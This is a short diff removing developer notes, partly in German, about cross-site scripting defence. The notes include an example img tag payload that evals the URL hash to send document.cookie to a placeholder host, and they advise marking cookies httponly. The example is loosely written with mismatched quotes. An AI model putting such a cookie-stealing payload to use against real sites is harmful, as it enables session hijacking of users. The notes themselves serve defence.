@@ -1,8 +1,0 @@
-- protect against onfocus="alert(1)", img=onload(eval())" etc.
-
-<img onload="eval(location.hash.slice(1)))>#src='http://harmlass.tld/log.jsp' + document.cookie'>
-schickt z.B. die Session-ID an einen anderen Rechner
-
-Cookie immer als httponly definieren ==> kann nicht via JS gelesen werden
-
-
